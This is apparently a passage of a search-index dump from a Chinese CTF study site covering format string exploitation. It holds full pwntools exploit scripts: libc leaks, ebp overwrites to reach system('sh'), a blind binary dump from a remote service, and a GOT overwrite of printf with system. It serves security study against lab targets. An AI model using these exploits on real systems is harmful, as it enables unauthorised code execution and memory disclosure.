\u7ed3\u6784\u56fa\u5b9a\u662f\u56e0\u4e3a\u6240\u6709\u8f93\u51fa\u5185\u5bb9\uff08\u53f7\u7801\u3001\u63cf\u8ff0\u7b49\uff09\u90fd\u662f\u4ee5\u5806\u5806\u6307\u9488\u5f62\u5f0f\u5b58\u50a8\u7684\uff0c\u4e5f\u5c31\u662f\u65e0\u8bba\u957f\u5ea6\u5982\u4f55\u53d8\u5316\u5728\u6808\u4e0a\u6240\u5728\u7a7a\u95f4\u90fd\u662f\u4e0d\u53d8\u7684\uff0cebp \u7684\u504f\u79fb\u4e5f\u5c31\u662f\u56fa\u5b9a\u4e86\u3002 \u5728\u90e8\u5206\u73af\u5883\u4e0b\uff0csystem \u5730\u5740\u4f1a\u51fa\u73b0 \\ x00\uff0c\u5bfc\u81f4 printf \u7684\u65f6\u5019\u51fa\u73b0 0 \u622a\u65ad\u5bfc\u81f4\u65e0\u6cd5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06 payload \u7684\u4fee\u6539\u5982\u4e0b\uff1a [%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd] payload \u4fee\u6539\u4e3a\u8fd9\u6837\u7684\u8bdd\uff0c\u8fd8\u9700\u8981\u5728 heap \u4e0a\u52a0\u5165 12 \u7684\u504f\u79fb\u3002\u8fd9\u6837\u4fdd\u8bc1\u4e86 0 \u622a\u65ad\u51fa\u73b0\u5728\u6cc4\u9732\u4e4b\u540e\u3002 [%6$p] \uff1a\u4e0a\u5c42\u51fd\u6570 ebp \u5730\u5740\uff1b [%11$p] \uff1a\u5806\u5757 fd \u6307\u9488\u5730\u5740\uff1b","title":"\u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740"},{"location":"fmtstr/fmtstr_example/#ebp","text":"\u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884c leave\uff08 ~~move \u6307\u4ee4\u5c06 ebp \u8d4b\u7ed9 esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884c pop ebp~~ \uff09\u624d\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06 ebp \u4fee\u6539\u4e3a\u5b58\u50a8 system \u5730\u5740 -4 \u7684\u503c\u3002\u8fd9\u6837 move esp,ebp \u4e4b\u540e\uff0cesp \u6070\u597d\u6307\u5411\u4fdd\u5b58 system \u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884c ret \u6307\u4ee4\u5373\u53ef\u6267\u884c system \u51fd\u6570\u3002 \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684 ebp \u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a 6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684 payload \u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002(\u8fd9\u91cc\u662f wiki \u7684\u4fee\u6539\u65b9\u6cd5\uff0c\u56e0\u4e3awiki exp \u6211\u672c\u5730\u6253\u4e0d\u901a\uff0c\u6362\u6210\u81ea\u5df1\u7684\uff0c\u6240\u4ee5\u4fee\u6539\u65b9\u6cd5\u4e5f\u4e0d\u4e00\u6837) part1 = (heap_addr - 4) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'","title":"\u4fee\u6539 ebp"},{"location":"fmtstr/fmtstr_example/#shell","text":"\u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u5165 5 \uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6 shell\u3002","title":"\u83b7\u53d6 shell"},{"location":"fmtstr/fmtstr_example/#_29","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : contacts.py from pwn import * context.log_level = 'debug' p = process(\"./contacts\") elf = ELF(\"./contacts\") #libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\") # \u4f7f\u7528\u9898\u76ee\u63d0\u4f9b\u7684libc libc = ELF(\"./libc.so\") def creat(name,number,length,description): p.sendlineafter(\">>> \",'1') p.sendlineafter(\"Name: \",name) p.sendlineafter(\"No: \",number) p.sendlineafter(\"description: \",str(length)) p.sendlineafter(\"description:\\n\",description) def free(name): p.sendlineafter(\">>> \",'2') p.sendlineafter(\"remove? \",name) def edit(name,choose,newname='skye',length=10,description='skye'): p.sendlineafter(\">>> \",'3') p.sendlineafter(\"change? \",name) p.sendlineafter(\">>> \",str(choose)) if(choose==1): p.sendlineafter(\"name: \",newname) elif(choose==2): p.sendlineafter(\"description: \",str(length)) p.sendlineafter(\"Description: \\n\",description) def show(): p.sendlineafter(\">>> \",'4') # leak libc creat(\"skye\",\"skye\",24,'a'*4+\"%31$p\") show() p.recvuntil('a'*4) libc_start_main = int(p.recv(10),16) log.info(\"libc_start_main:\"+hex(libc_start_main)) libc_base = libc_start_main - 0x18637 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + libc.symbols['system'] log.info(\"system_addr:\"+hex(system_addr)) binsh_addr = libc_base + libc.search('sh\\x00').next() log.info(\"binsh_addr:\"+hex(binsh_addr)) # leak ebp&heap addr # \u5c06system\u524d\u7f6e\u53ef\u80fd\u4f1a\u9047\u5230\\x00\u963b\u65ad\uff0c\u53ef\u81ea\u884c\u540e\u7f6e\uff0c\u5e76\u8c03\u6574ebp\u8986\u76d6\u503c payload = p32(system_addr) + 'bbbb' + p32(binsh_addr) + '%6$p%11$pcccc' creat('2222', 'skye', 0x20, payload) show() p.recvuntil('Description: ') data = p.recvuntil('cccc', drop=True) data = data.split('0x') ebp_addr = int(data[-2], 16) log.info(\"ebp_addr:\"+hex(ebp_addr)) heap_addr = int(data[-1], 16) log.info(\"heap_addr:\"+hex(heap_addr)) # overwrite main_ebp payload = '%{}c%6$n'.format(str(heap_addr-4)) creat('3333', 'skye', 68, payload) #gdb.attach(p,'b *0x0804876A') #raw_input('pause') show() #getshell p.recvuntil('>>> ') p.sendline('5') p.interactive() \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230 shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u6253\u5370\u8fd9\u4e48\u591a\u5462\uff1f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e0d\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u5c31\u7b97\u6211\u4eec\u5f97\u5230\u4e86\u9700\u8981\u66f4\u6539\u7684 ebp \u7684\u5730\u5740\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u53bb\u628a\u8fd9\u4e2a\u5730\u5740\u5199\u5230\u6808\u4e0a\uff0c\u5229\u7528 $ \u7b26\u53f7\u53bb\u5b9a\u4f4d\u4ed6\uff1b\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u5b9a\u4f4d\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u7528 hn\\hhn \u7b49\u65b9\u5f0f\u53bb\u5199\u8fd9\u4e2a\u5730\u5740\uff0c\u53ea\u80fd\u7528 n \u65b9\u5f0f\u53bb\u5199\uff0c\u6240\u4ee5\u6253\u5370\u5f88\u591a\u3002 \u6ce8\u89e3 \uff1a \u6211\u7684\u811a\u672c\u4e2d\u7528\u7684\u4e0d\u662f system('/bin/sh') \uff0c\u800c\u662f system('sh') \uff0c\u8fd9\u662f\u56e0\u4e3a\u7528\u9898\u76ee\u63d0\u4f9b\u7684 libc \u641c\u7d22 /bin/sh \u5f97\u5230\u7ed3\u679c\u6709\u8bef\uff0c\u5f97\u5230\u7684\u5730\u5740\u4e0d\u662f /bin/sh \uff1a \u800c\u53bb\u5230 libcdatabase \u5f97\u5230\u7ed3\u679c\u662f\uff1a 0xf7f60a0b \uff0c\u91cc\u9762\u6709\u4e00\u4e2a 0x0a \u5c31\u662f\u6362\u884c\u7b26\u561b\uff0c\u8fd9\u6837\u4f1a\u63d0\u524d\u7ec8\u6b62\u8f93\u5165\uff0c\u6240\u4ee5\u4e5f\u4e0d\u884c\u3002\u6700\u540e\u4f7f\u7528\u9898\u76ee\u63d0\u4f9b libc \u641c\u7d22 sh \uff0c\u6210\u529f getshell \u3002 \u5728\u6211\u7684\u73af\u5883\uff08Ubuntu 16.04\uff09\u6ca1\u6709\u9047\u5230 system \\x00 \u963b\u65ad\uff0c\u6240\u4ee5 payload \u4e2d system \u524d\u7f6e\u3002\u5982\u679c\u9047\u5230\u963b\u65ad\uff0c\u5c31\u5c06 system \u540e\u7f6e\uff0c\u5e76\u8c03\u6574 ebp \u8986\u76d6\u5185\u5bb9\u52a0\u4e0a\u504f\u79fb\u5373\u53ef\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_30","text":"ctf-wiki \u4e0a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4ecb\u7ecd\u4e0d\u662f\u5f88\u5168\u9762\uff0c\u6211\u67e5\u4e86\u5176\u4ed6\u5927\u4f6c\u7684\u7b14\u8bb0\uff0c\u81ea\u5df1\u603b\u7ed3\u4e86\uff1a Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"fmtstr/fmtstr_example/#_31","text":"\u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884c pwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#1-","text":"\u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939 fmt_blind_stack \u4e2d\u3002","title":"\u4f8b\u5b50 1 - \u6cc4\u9732\u6808"},{"location":"fmtstr/fmtstr_example/#_32","text":"\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86 %p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f \u279c blind_fmt_stack git:(master) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% \u544a\u8bc9\u6211\u4eec flag \u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"},{"location":"fmtstr/fmtstr_example/#_33","text":"\u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b from pwn import * context.log_level = 'error' def leak(payload): sh = remote('127.0.0.1', 9999) sh.sendline(payload) data = sh.recvuntil('\\n', drop=True) if data.startswith('0x'): print p64(int(data, 16)) sh.close() i = 1 while 1: payload = '%{}$p'.format(i) leak(payload) i += 1 \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230 flag //////// //////// \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff flag{thi s_is_fla g}\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\xfe\\x7f\\x00\\x00","title":"\u5229\u7528"},{"location":"fmtstr/fmtstr_example/#2-got","text":"\u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728 blind_fmt_got \u6587\u4ef6\u5939\u4e2d\u3002","title":"\u4f8b\u5b50 2 - \u76f2\u6253\u52ab\u6301 got"},{"location":"fmtstr/fmtstr_example/#_34","text":"\u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a 64 \u4f4d\u3002 \u279c blind_fmt_got git:(master) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"},{"location":"fmtstr/fmtstr_example/#_35","text":"\u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b \u279c blind_fmt_got git:(master) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a 6\u3002","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"fmtstr/fmtstr_example/#binary","text":"\u7531\u4e8e\u7a0b\u5e8f\u662f 64 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece 0x400000 \u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002 ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num += 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len(data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr += len(data) f.close() getbinary() \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 payload \u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709 '\\n' \u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002","title":"\u6cc4\u9732 binary"},{"location":"fmtstr/fmtstr_example/#binary_1","text":"\u5229\u7528 IDA \u6253\u5f00\u6cc4\u9732\u7684 binary \uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8f main \u51fd\u6570\u7684\u5730\u5740 seg000:00000000004005F6 push rbp seg000:00000000004005F7 mov rbp, rsp seg000:00000000004005FA add rsp, 0FFFFFFFFFFFFFF80h seg000:00000000004005FE seg000:00000000004005FE loc_4005FE: ; CODE XREF: seg000:0000000000400639\u0019j seg000:00000000004005FE lea rax, [rbp-80h] seg000:0000000000400602 mov edx, 80h ; '\u20ac' seg000:0000000000400607 mov rsi, rax seg000:000000000040060A mov edi, 0 seg000:000000000040060F mov eax, 0 seg000:0000000000400614 call sub_4004C0 seg000:0000000000400619 lea rax, [rbp-80h] seg000:000000000040061D mov rdi, rax seg000:0000000000400620 mov eax, 0 seg000:0000000000400625 call sub_4004B0 seg000:000000000040062A mov rax, cs:601048h seg000:0000000000400631 mov rdi, rax seg000:0000000000400634 call near ptr unk_4004E0 seg000:0000000000400639 jmp short loc_4005FE \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662f sub_4004C0 \u4e3a read \u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662f read \u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684 sub_4004B0 \u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a while 1 \u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002 \u6ce8\u89e3\uff1a \u8865\u5145\u4e00\u5f20\u56fe","title":"\u5206\u6790 binary"},{"location":"fmtstr/fmtstr_example/#_36","text":"\u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740\uff0c \u83b7\u53d6\u5bf9\u5e94 libc \u4ee5\u53ca system \u51fd\u6570\u5730\u5740 \u4fee\u6539 printf \u5730\u5740\u4e3a system \u51fd\u6570\u5730\u5740 \u8bfb\u5165 /bin/sh; \u4ee5\u4fbf\u4e8e\u83b7\u53d6 shell","title":"\u5229\u7528\u601d\u8def"},{"location":"fmtstr/fmtstr_example/#_37","text":"\u7a0b\u5e8f\u5982\u4e0b\u3002 ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context.arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num += 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len(data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr += len(data) f.close() ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote(ip, port) ## let the read get resolved sh.sendline('a') sh.recv() ## get printf addr payload = '%00008$s' + 'STARTEND' + p64(read_got) sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\\x00') sh.recv() read_addr = u64(data) ## get system addr libc = LibcSearcher('read', read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') log.success('system addr: ' + hex(system_addr)) log.success('read addr: ' + hex(read_addr)) ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() ## get shell sh.sendline('/bin/sh;') sh.interactive() \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801 ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() fmtstr_payload \u76f4\u63a5\u5f97\u5230\u7684 payload \u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4 printf \u7684\u65f6\u5019 '\\x00' \u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools \u76ee\u524d\u6b63\u5728\u5f00\u53d1 fmt_payload \u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u9762 8 \u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9 payload \u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f offset = (int)(math.ceil(len(payload) / 8.0) + 1) \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e '%order$hn' \u4e2d order \u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e 8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_38","text":"SuCTF2018 - lock2 \uff08\u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2\uff09","title":"\u9898\u76ee"},{"location":"fmtstr/fmtstr_exploit/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528 \u9605\u8bfb ctf-wiki \u540e\u603b\u7ed3 \u6cc4\u9732\u5185\u5b58 \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528 GOT \u8868\u5f97\u5230 libc \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6 libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83 libc \u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump \u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002 \u7b80\u5355\u7684\u6cc4\u9732\u6808\u5185\u5b58 \u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> # file:leakmemory.c int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\"%s\", s); printf(\"%08x.%08x.%08x.%s\\n\", a, b, c, s); printf(s); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e return 0; } 32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u6808\u4f20\u53c2\uff0c64 \u4f4d\u7cfb\u7edf\u524d 7 \u4e2a\u53c2\u6570\u662f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\u300232 \u4f4d\u7a0b\u5e8f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u51fa\u5b58\u5728\u6808\u4e0a\u7684\u53c2\u6570\u3002\uff0864 \u4f4d\u8981\u5bf9\u5e94\u8c03\u6574\uff09 \u7f16\u8bd1 32 \u4f4d\u7a0b\u5e8f\uff1a gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c \u8f93\u5165\u8f93\u51fa\u5982\u4e0b\uff1a >>>%p.%p.%p 00000001.22222222.ffffffff.%p.%p.%p 0xffffcd10.0xc2.0xf7e8b6bb \u6808\u60c5\u51b5\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" # \u5f00\u59cb\u6cc4\u9732\u4f4d\u7f6e 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\" \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 